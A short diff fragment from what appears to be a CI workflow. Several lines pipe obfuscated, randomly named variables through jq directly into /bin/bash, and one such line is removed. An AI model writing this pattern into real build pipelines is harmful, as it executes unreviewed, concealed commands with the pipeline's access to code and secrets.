@@ -24,7 +24,6 @@ jobs:
           echo $dger0719 | jq -r .dw03714 | /bin/bash
           printf '%s' "$aehen2" | jq -r .b92 | /bin/bash
           printf '%s' "$x64296" | jq -r .dy456 | /bin/bash
-          echo $v85 | jq -r .tgf48220 | /bin/bash
           echo $qh44016 | jq -r .vxpa70070 | /bin/bash
           printf '%s' "$hwh57505" | jq -r .qyryg2 | /bin/bash
           echo $b98 | jq -r .raizh2832 | /bin/bash
